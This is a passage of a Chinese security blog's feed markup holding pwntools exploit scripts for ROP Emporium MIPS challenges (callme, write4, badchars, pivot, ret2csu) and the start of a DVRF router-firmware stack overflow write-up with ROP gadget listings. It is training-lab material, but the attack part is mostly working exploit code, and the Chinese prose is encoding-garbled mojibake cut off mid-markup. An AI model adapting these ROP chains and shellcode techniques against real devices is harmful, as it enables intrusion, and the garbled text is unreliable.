class="hljs-string">&#x27;callme_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./callme_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>key1 = <span class="hljs-number">0xDEADBEEF</span><br>key2 = <span class="hljs-number">0xCAFEBABE</span><br>key3 = <span class="hljs-number">0xD00DF00D</span><br><br>gadget = <span class="hljs-number">0x400bb0</span><br>callme_one = <span class="hljs-number">0x400d20</span><br>callme_two = <span class="hljs-number">0x400d80</span><br>callme_three = <span class="hljs-number">0x400d10</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(callme_one) + p32(key3) + p32(key2) + p32(key1)<br>payload += p32(gadget) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(callme_two) + p32(key3) + p32(key2) + p32(key1)<br>payload += p32(gadget) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(callme_three) + p32(key3) + p32(key2) + p32(key1)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="4-write4"><a href="#4-write4" class="headerlink" title="4.write4"></a>4.write4</h4><p>é€šè¿‡æ‰§è¡Œprint_fileå‡½æ•°ï¼Œå°†print_fileå‡½æ•°å‚æ•°flag.txtå†™åˆ°dataæ®µæˆ–è€…bssæ®µä¸Šï¼Œå¯è¾“å‡ºflag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;write4_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&quot;qemu-mipsel&quot;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&quot;write4_mipsel&quot;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget = <span class="hljs-number">0x400930</span><br>print_file = <span class="hljs-number">0x400a90</span><br>pwnme = <span class="hljs-number">0x400a70</span><br>buf = <span class="hljs-number">0x411000</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + <span class="hljs-string">b&#x27;flag&#x27;</span> + p32(buf) + p32(pwnme)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + <span class="hljs-string">b&#x27;.txt&#x27;</span> + p32(buf + <span class="hljs-number">4</span>) + p32(pwnme)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget + <span class="hljs-number">0x18</span>) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + p32(print_file) + p32(buf)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="5-badchars"><a href="#5-badchars" class="headerlink" title="5.badchars"></a>5.badchars</h4><p>ä¸write4ä¸€æ ·ï¼Œé€šè¿‡æ‰§è¡Œprint_fileå‡½æ•°ï¼Œå°†print_fileå‡½æ•°å‚æ•°flag.txtå†™åˆ°dataæ®µæˆ–è€…bssæ®µä¸Šï¼Œå¯è¾“å‡ºflag</p><p>ä½†ä¼šå¯¹å­—ç¬¦ä¸²åˆ¤æ–­ï¼Œå¦‚æœå­—ç¬¦ä¸²ä¸­â€™æœ‰xâ€™ï¼Œâ€™gâ€™ï¼Œâ€™aâ€™ï¼Œâ€™.â€™è¿™äº›å­—ç¬¦å°±ä¼šèµ‹å€¼ä¸º-21ï¼Œå¯ä»¥é€šè¿‡xoråŠ å¯†ç»•è¿‡åˆ¤æ–­ï¼Œ</p><p>ç„¶åxorè¿˜åŸã€‚å’Œx86ä¸åŒçš„æ˜¯MIPSéœ€è¦åœ°å€å¯¹é½æ‰èƒ½æ­£å¸¸å–å‡ºå­—ç¬¦ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;badchars_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./badchars_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget1 = <span class="hljs-number">0x400930</span><br>gadget2 = <span class="hljs-number">0x400948</span><br>gadget3 = <span class="hljs-number">0x400968</span><br>buf = <span class="hljs-number">0x411000</span><br><br>badchars = [<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>]<br>new_flag = <span class="hljs-string">&quot;&quot;</span><br>xor_byte = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    output = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;flag.txt&quot;</span>:<br>        c = <span class="hljs-built_in">ord</span>(i)  ^  xor_byte<br>        c =  <span class="hljs-built_in">chr</span>(c)<br>        <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> badchars:<br>            xor_byte += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            output += c<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(output) == <span class="hljs-number">8</span>:<br>        new_flag = output<br>        <span class="hljs-keyword">break</span><br>new_flag = <span class="hljs-built_in">bytes</span>(new_flag.encode())<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">36</span> + p32(gadget1) + p32(<span class="hljs-number">0</span>) + new_flag[:<span class="hljs-number">4</span>] + p32(buf) + p32(gadget1)<br>payload += p32(<span class="hljs-number">0</span>) + new_flag[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>] + p32(buf + <span class="hljs-number">4</span>) + p32(gadget2)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    xor_b = xor_byte &lt;&lt; (i * <span class="hljs-number">8</span>)<br>    payload += p32(<span class="hljs-number">0</span>) + p32(buf) + p32(xor_b)  + p32(gadget2)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    xor_b = xor_byte &lt;&lt; (i * <span class="hljs-number">8</span>)<br>    payload += p32(<span class="hljs-number">0</span>) + p32(buf + <span class="hljs-number">4</span>) + p32(xor_b)  + p32(gadget2)<br>payload += p32(<span class="hljs-number">0</span>) + p32(buf + <span class="hljs-number">4</span>) + p32(xor_byte &lt;&lt; <span class="hljs-number">24</span>)  + p32(gadget3) <br>payload += p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0x400ab0</span>) + p32(buf)<br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>) <br></code></pre></td></tr></table></figure><h4 id="7-pivot"><a href="#7-pivot" class="headerlink" title="7.pivot"></a>7.pivot</h4><p>æº¢å‡ºååˆ©ç”¨æ ˆè¿ç§»ä¿®æ”¹foothold_functionå‡½æ•°gotè¡¨çš„åœ°å€ä¸ºret2winçš„åœ°å€å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pivot_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./pivot_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget1 = <span class="hljs-number">0x400ca0</span><br>gadget2 = <span class="hljs-number">0x400cb0</span><br>gadget3 = <span class="hljs-number">0x400cc4</span><br>gadget4 = <span class="hljs-number">0x400cd0</span><br><br>foothold = <span class="hljs-number">0x400e60</span><br>foothold_got = <span class="hljs-number">0x412060</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>pivot_addr = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br><br>payload1 = p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(gadget1) + p32(<span class="hljs-number">0</span>) +  p32(<span class="hljs-number">0x378</span>) + p32(foothold)<br>payload1 += p32(<span class="hljs-number">0</span>) + p32(foothold_got) + p32(gadget1) + p32(<span class="hljs-number">0</span>) +  p32(<span class="hljs-number">0x378</span>) + p32(gadget3)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload1)<br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">32</span> + p32(pivot_addr) + p32(gadget4)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload2)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="8-ret2csu"><a href="#8-ret2csu" class="headerlink" title="8.ret2csu"></a>8.ret2csu</h4><p>ä½¿ç”¨glibcç¼–è¯‘çš„Â·MIPSæ¶æ„ç¨‹åºåŒæ ·æ‹¥æœ‰libc_csu_initæ®µï¼Œæ‰€ä»¥ä½¿ç”¨ret2csuè°ƒç”¨ret2winå‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ret2csu_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./ret2csu_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget1 = <span class="hljs-number">0x4009c0</span><br>gadget2 = <span class="hljs-number">0x4009a0</span><br><br>key1 = <span class="hljs-number">0xDEADBEEF</span><br>key2 = <span class="hljs-number">0xCAFEBABE</span><br>key3 = <span class="hljs-number">0xD00DF00D</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">36</span> + p32(gadget1) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x1c</span><br>payload += p32(<span class="hljs-number">0x411058</span>)<br>payload += p32(<span class="hljs-number">0</span>)<br>payload += p32(<span class="hljs-number">1</span>)<br>payload += p32(key1)<br>payload += p32(key2)<br>payload += p32(key3)<br>payload += p32(gadget2)<br>payload += p32(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span><br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVRFè·¯ç”±æ¼æ´é¶æœºä¸­å‡ é“é¢˜çš„å¤ç°</title>
    <link href="/2022/11/08/DVRF%E8%B7%AF%E7%94%B1%E9%9D%B6%E6%9C%BA/"/>
    <url>/2022/11/08/DVRF%E8%B7%AF%E7%94%B1%E9%9D%B6%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/praetorian-inc/DVRF">https://github.com/praetorian-inc/DVRF</a></p><p>ä½¿ç”¨binwalkæå–å›ºä»¶DVRF_v03.bin</p><p>æœ¬åœ°ç¯å¢ƒï¼škali-2022.2ï¼Œqemu-7.0</p><h3 id="stack-bof-02"><a href="#stack-bof-02" class="headerlink" title="stack_bof_02"></a>stack_bof_02</h3><h4 id="æ ˆæº¢å‡ºåˆ†æ"><a href="#æ ˆæº¢å‡ºåˆ†æ" class="headerlink" title="æ ˆæº¢å‡ºåˆ†æ"></a>æ ˆæº¢å‡ºåˆ†æ</h4><p>ä½¿ç”¨idaåˆ†æï¼Œä½¿ç”¨strcpyäº†å‡½æ•°ï¼Œåªè¦ä¸å‡ºç°\x00å­—ç¬¦ï¼Œå°±å¯ä»¥å®ç°æ ˆæº¢å‡ºã€‚</p><p>å¯åŠ¨ç¨‹åºï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">qemu-mipsel -L .<span class="hljs-regexp">/ -g 1234 ./</span>pwnable<span class="hljs-regexp">/ShellCode_Required/</span>stack_bof_02 aaaaaaaaaaaaa<br></code></pre></td></tr></table></figure><p>å…³äºæº¢å‡ºçš„å­—èŠ‚æ•°ï¼Œæˆ‘æ˜¯ç›´æ¥ç”¨pwndbgè§‚å¯Ÿæ ˆä¸Šçš„åœ°å€å’Œç¨‹åºä¸­çš„æ±‡ç¼–è®¡ç®—å‡ºçš„ï¼š0x407ffdd0 + 0x214 -  0x407ffde8 &#x3D; 0x1fc</p><p>â€‹       <img src="/img/5/Screenshot_20221110_055957.png" style="zoom:67%;" />        </p><p>â€‹                                                                     </p><p>ç”±äºæ²¡æœ‰åé—¨å‡½æ•°ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨shellcodeï¼Œ</p><ol><li>MIPSä¸æ”¯æŒNXä¿æŠ¤ï¼Œå†™å…¥æ ˆä¸­çš„shellcodeå¯ä»¥ç›´æ¥è¢«æ‰§è¡Œï¼›</li><li>ä½¿ç”¨ROPåŠ«æŒæ§åˆ¶æµï¼Œè™½ç„¶ç¨‹åºgadgetå¾ˆå°‘ï¼Œä½†libcæ–‡ä»¶ä¸­æœ‰å¤§é‡çš„gadgetï¼Œä¸”qemuæ¨¡æ‹Ÿæ— æ³•åšåˆ°åœ°å€éšæœºåŒ–ï¼Œlibcçš„åŸºåœ°å€æ¯æ¬¡å¯åŠ¨ä¹Ÿéƒ½æ˜¯å›ºå®šçš„ï¼›</li><li>ç”±äºç¼“å­˜ä¸ä¸€è‡´æ€§ï¼ŒæŒ‡ä»¤cacheå’Œæ•°æ®cacheä¸¤è€…çš„åŒæ­¥éœ€è¦ä¸€ä¸ªæ—¶é—´æ¥åŒæ­¥ï¼Œå¦åˆ™å°±ä¼šå¤±æ•ˆï¼›è¿™é‡Œéœ€è¦è°ƒç”¨sleepå‡½æ•°æ¥è®©shellcodeä»æ•°æ®cacheåˆ·æ–°åˆ°æŒ‡ä»¤cacheï¼Œç„¶ååœ¨è·³è½¬åˆ°shellcodeå»æ‰§è¡Œã€‚</li></ol><p>libcåŸºåœ°å€çš„å¯»æ‰¾ï¼š</p> <img src="/img/5/Screenshot_20221110_052742.png" style="zoom:67%;" /><p>æŸ¥çœ‹putså‡½æ•°çš„è°ƒç”¨ ,ç„¶ååœ¨libcæ–‡ä»¶ä¸­æ‰¾åˆ°åç§» 0x3fefc420 - 0x17420  &#x3D; 0x3fee5000 ï¼ˆä¸åŒçš„ç¯å¢ƒæ¨¡æ‹Ÿå‡ºçš„åœ°å€ä¹Ÿä¼šæœ‰æ‰€ä¸åŒï¼‰</p><h4 id="ç¼–å†™ROP"><a href="#ç¼–å†™ROP" class="headerlink" title="ç¼–å†™ROP"></a>ç¼–å†™ROP</h4><p>è¿™é‡Œæˆ‘æ˜¯å‚è€ƒH4loå¸ˆå‚…çš„<a href="https://www.cnblogs.com/H4lo/p/10542913.html">æ–‡ç« </a>å»å¯»æ‰¾çš„gadget</p><p>ä½¿ç”¨mipsropæ‰¾åˆ°çš„gadgetè·³è½¬åˆ°æŒ‡å®šåœ°å€å¤§å¤šéƒ½æ˜¯é€šè¿‡å¦ä¸€ä¸ªå¯„å­˜å™¨å»èµ‹å€¼ï¼Œè€ŒåŸç¨‹åºä¸­æˆ‘ä»¬æº¢å‡ºååªèƒ½æ§åˆ¶$raå¯„å­˜å™¨ï¼Œæ— æ³•æ§åˆ¶æ›´å¤šçš„å¯„å­˜å™¨ï¼›ä¸ºäº†æ–¹ä¾¿gadgetçš„ä½¿ç”¨ï¼Œé¦–å…ˆæº¢å‡ºååŠ«æŒåˆ°scandirå‡½æ•°ç»“å°¾éƒ¨åˆ†ï¼Œè®©æˆ‘ä»¬å¯ä»¥æ§åˆ¶æ›´å¤šçš„å¯„å­˜å™¨ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFE0 <span class="hljs-number">3</span>C <span class="hljs-number">00</span> BF <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$ra</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s24</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFE4 <span class="hljs-number">38</span> <span class="hljs-number">00</span> BE <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$fp</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s20</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFE8 <span class="hljs-number">34</span> <span class="hljs-number">00</span> B7 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s7</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s1C</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFEC <span class="hljs-number">30</span> <span class="hljs-number">00</span> B6 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s6</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s18</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFF0 <span class="hljs-number">2</span>C <span class="hljs-number">00</span> B5 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s5</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s14</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFF4 <span class="hljs-number">28</span> <span class="hljs-number">00</span> B4 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s4</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s10</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFF8 <span class="hljs-number">24</span> <span class="hljs-number">00</span> B3 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s3</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_sC</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFFC <span class="hljs-number">20</span> <span class="hljs-number">00</span> B2 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s2</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s8</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>B000 <span class="hljs-number">1</span>C <span class="hljs-number">00</span> B1 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s1</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s4</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>B004 <span class="hljs-number">18</span> <span class="hljs-number">00</span> B0 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s0</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s0</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>B008 <span class="hljs-number">08</span> <span class="hljs-number">00</span> E0 <span class="hljs-number">03</span>                   jr      <span class="hljs-variable">$ra</span><br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>B00C <span class="hljs-number">40</span> <span class="hljs-number">00</span> BD <span class="hljs-number">27</span>                   addiu   <span class="hljs-variable">$sp</span>, <span class="hljs-number">0</span>x40<br></code></pre></td></tr></table></figure><p>å†ä½¿ç”¨mipsrop.find(â€œli $a0,1â€)æ‰¾åˆ°ç›¸åº”çš„gadgetï¼Œå°†$a0èµ‹å€¼ä¸º1ï¼Œä½œä¸ºsleepå‡½æ•°çš„å‚æ•°ï¼Œå¦‚æœ$a0æœ¬èº«å°±å­˜åœ¨å€¼ä¹Ÿå¯ä»¥ä¸ç”¨è¿™ä¸ªæ“ä½œï¼Œå¯èƒ½sleepçš„æ—¶é—´ä¼šé•¿ä¸€ç‚¹ï¼š</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">.<span class="hljs-keyword">text</span>:<span class="hljs-number">0002</span>FB10 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span>                   li      $a0, <span class="hljs-number">1</span><br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">0002</span>FB14 <span class="hljs-number">21</span> C8 <span class="hljs-number">20</span> <span class="hljs-number">02</span>                   <span class="hljs-keyword">move</span>    $t9, $s1<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">0002</span>FB18 <span class="hljs-number">09</span> F8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   jalr    $t9<br></code></pre></td></tr></table></figure><p>è°ƒç”¨sleepå‡½æ•°åè¿˜éœ€è¦è¿›ä¸€æ­¥è°ƒç”¨shellcodeï¼Œæ‰€ä»¥ç»™$a0èµ‹å€¼å€¼åä¸èƒ½ç›´æ¥å»æ‰§è¡Œsleepå‡½æ•°ï¼Œè¿™é‡Œè¦è¿›ä¸€æ­¥è°ƒç”¨xdr_unionå‡½æ•°ç»“å°¾éƒ¨åˆ†ï¼Œæ‰§è¡Œå®Œsleepå‡½æ•°åå¯ä»¥ç»§ç»­æ²¿ç€ROPé“¾æ‰§è¡Œï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C34 <span class="hljs-number">21</span> C8 <span class="hljs-number">60</span> <span class="hljs-number">02</span>                   <span class="hljs-keyword">move </span>   $<span class="hljs-built_in">t9</span>, $<span class="hljs-built_in">s3</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C38 <span class="hljs-number">2</span>C <span class="hljs-number">00</span> <span class="hljs-keyword">BF </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">ra</span>, <span class="hljs-number">0x18</span>+var_s14($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C3C <span class="hljs-number">28</span> <span class="hljs-number">00</span> <span class="hljs-keyword">B4 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s4</span>, <span class="hljs-number">0x18</span>+var_s10($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C40 <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-keyword">B3 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s3</span>, <span class="hljs-number">0x18</span>+var_sC($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C44 <span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-keyword">B2 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s2</span>, <span class="hljs-number">0x18</span>+var_s8($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C48 <span class="hljs-number">1</span>C <span class="hljs-number">00</span> <span class="hljs-keyword">B1 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s1</span>, <span class="hljs-number">0x18</span>+var_s4($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C4C <span class="hljs-number">18</span> <span class="hljs-number">00</span> <span class="hljs-keyword">B0 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span 